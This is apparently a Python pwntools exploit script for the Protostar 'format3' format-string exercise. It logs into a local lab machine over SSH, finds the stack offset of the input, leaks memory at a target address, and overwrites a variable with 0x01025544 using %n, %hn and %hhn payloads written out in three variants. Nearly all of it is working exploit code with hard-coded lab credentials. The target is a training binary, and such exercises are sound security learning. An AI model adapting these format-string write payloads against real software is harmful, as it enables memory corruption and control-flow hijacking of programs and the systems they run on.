from pwn import * 




def find_pos():
    r = ssh(host="192.168.160.128" ,password="user" , user="user")

    control_pos=0

    for i in range(20):
        format3 = r.run(["/opt/protostar/bin/format3"])
        payload="CCCC%{}$pAAAA".format(i)

        format3.sendline(payload)
        output=str(format3.recv())
        if "43434343" in output:
            print("POSTION : ", i, "\noutput: ", output)
            control_pos= i

            format3.close()
            return control_pos 
        format3.close()

    return control_pos


#find_pos()
control_pos = 12



# value to overwrite : 0x01025544
target_address = 0x080496f4



def leak_at_target(desire_addr):
    
    r = ssh(host="192.168.160.128" ,password="user" , user="user")
    payload = p32(desire_addr) +  b"%12$sAAAA" 
    format3 = r.run(["/opt/protostar/bin/format3"])
    format3.sendline(payload)  
    print("LEAK AT ADDRESS : ", hex(desire_addr))
    print(format3.recv())
    format3.close()

#leak_at_target(target_address)
# leak_at_target(target_address+2)


def overwrite4_bytes():
    r = ssh(host="192.168.160.128" ,password="user" , user="user")
    payload = p32(target_address) +  b"%16930112x%12$nAAAA" 
    format3 = r.run(["/opt/protostar/bin/format3"])
    format3.sendline(payload)
    print(format3.recvuntil(b"target"))
    format3.close()

#overwrite4_bytes()




# value to overwrite : 0x01025544

# solution 2
def overwrite2_bytes():
    r =ssh(host="192.168.160.128", user='user', password="user")
    format3 = r.run(["/opt/protostar/bin/format3"])

    payload =  p32(target_address) + p32(target_address+2) + b"%21820x"  + b"%12$hnAAAA"    +   b"%43962x"  +  b"%13$hnAAAA" 
    format3.sendline(payload)
    print(format3.recvuntil("target"))
    format3.close()




#overwrite2_bytes()





# solution 3


def overwrite1_bytes():
    r =ssh(host="192.168.160.128", user='user', password="user")
    format3 = r.run(["/opt/protostar/bin/format3"])

    payload =  p32(target_address) + p32(target_address+1) + p32(target_address+2) + p32(target_address+3)  + b"%52x"  +  b"%12$hhnAAAA"  + b"%13x"  +  b"%13$hhnAAAA"  +   b"%169x"  +  b"%14$hhnAAAA"   +  b"%251x"  +  b"%15$hhnAAAA" 


    format3.sendline(payload)
    print(format3.recvuntil(":)"))
    format3.close()



#loverwrite1_bytes()


